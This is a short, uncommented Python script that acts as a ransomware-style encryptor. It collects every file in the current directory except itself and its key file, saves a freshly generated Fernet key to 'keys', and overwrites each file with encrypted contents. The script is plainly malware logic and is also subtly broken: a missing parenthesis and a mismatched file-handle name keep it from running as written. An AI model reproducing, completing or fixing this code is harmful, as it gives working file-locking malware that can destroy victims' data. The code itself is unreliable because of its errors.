#!/usr/bin/python3
import os
from cryptography.fernet import Fernet

files_dir=[]

for file in os.listdir():
    if(file == "doc.py" or file == "keys"):
        continue
    if(os.path.isfile(file):
        files_dir.append(file) 
key=Fernet.generate_key()
with open("keys","wb") as akey:
    akey.write(key)


for file in files_dir:
       with open(file, "rb") as reading_files:
            contents=reading_files.read()
       encrypted_data=Fernet(key).encrypt(contents)

       with open(file, "wb") as wrting_enc_data:
            writing_enc_data.write(encrypted_data)
            
